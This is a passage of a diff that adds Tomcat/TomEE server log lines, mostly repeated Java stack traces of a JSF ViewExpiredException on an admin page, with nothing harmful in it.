+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:48.177 SEVERE [http-nio-8080-exec-10] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:49.643 SEVERE [http-nio-8080-exec-6] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:49.813 SEVERE [http-nio-8080-exec-8] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:50.003 SEVERE [http-nio-8080-exec-3] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:50.174 SEVERE [http-nio-8080-exec-7] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:50.384 SEVERE [http-nio-8080-exec-9] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
+	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
+	at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128)
+	at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628)
+	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
+	at java.base/java.lang.Thread.run(Thread.java:834)
+
+14-Jul-2024 20:28:50.561 SEVERE [http-nio-8080-exec-2] com.sun.faces.context.AjaxExceptionHandlerImpl.handlePartialResponseError javax.faces.application.ViewExpiredException: viewId:/admin/index.xhtml - View /admin/index.xhtml could not be restored.
+	at com.sun.faces.lifecycle.RestoreViewPhase.execute(RestoreViewPhase.java:218)
+	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:100)
+	at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:133)
+	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:201)
+	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:670)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.openejb.server.httpd.EEFilter.doFilter(EEFilter.java:65)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.ocpsoft.rewrite.servlet.RewriteFilter.doFilter(RewriteFilter.java:226)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLessToExtension(FacesViewsForwardingFilter.java:180)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:137)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.filterExtensionLess(FacesViewsForwardingFilter.java:123)
+	at org.omnifaces.facesviews.FacesViewsForwardingFilter.doFilter(FacesViewsForwardingFilter.java:84)
+	at org.omnifaces.filter.HttpFilter.doFilter(HttpFilter.java:108)
+	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)
+	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)
+	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)
+	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)
+	at org.apache.tomee.catalina.OpenEJBValve.invoke(OpenEJBValve.java:45)
+	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:541)
+	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)
+	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
+	at org.apache.tomee.catalina.OpenEJBSecurityListener$RequestCapturer.invoke(OpenEJBSecurityListener.java:97)
+	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:690)
+	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)
+	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
+	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:373)
+	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65)
+	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868)
+	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590)
